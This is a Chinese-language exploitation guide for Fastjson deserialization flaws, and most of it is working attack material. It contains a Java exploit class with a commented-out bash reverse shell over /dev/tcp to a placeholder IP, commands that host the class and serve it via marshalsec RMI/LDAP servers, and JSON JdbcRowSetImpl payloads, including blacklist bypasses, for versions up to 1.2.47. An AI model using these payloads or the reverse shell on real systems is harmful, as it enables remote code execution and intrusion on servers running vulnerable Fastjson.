### FastJson反序列化

**注意**：

1. autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

2. 存在java版本限制：
    基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。
    在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。
    基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。
    在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。
    可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。



利用：

构造自己的java类

```java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"touch","/tmp/success"});
      //Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/xx.xx.xx.xx/1888;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

利用javac生成class文件

开启http服务，并将class文件放在可访问目录

```
python3 -m http.server 9998
```

开启RMI服务或者LDAP服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://10.10.10.129:9998/#TouchFile" 9999 

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.10.129:9998/#TouchFile" 9999
```



#### fastjson<=1.2.24

exp：

```
{
"b":{
          "@type":"com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName":"rmi://10.10.10.129:9999/TouchFile",
          "autoCommit":true
    }
}
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220624115429.png)



#### fastjson<=1.2.41

第一个Fastjson反序列化漏洞爆出后，阿里在1.2.25版本设置了autoTypeSupport属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。 ```com.sun.rowset.JdbcRowSetImpl```在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。

exp:

```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```



#### fastjson<=1.2.47

去年护网爆出的漏洞，对版本小于1.2.48的版本通杀，autoType为关闭状态也可使用。
 loadClass中默认cache设置为true，利用分为2步执行，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类，绕过了黑名单机制。

exp:

```
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "rmi://x.x.x.x:1098/jndi", 
        "autoCommit": true
    }
}
```





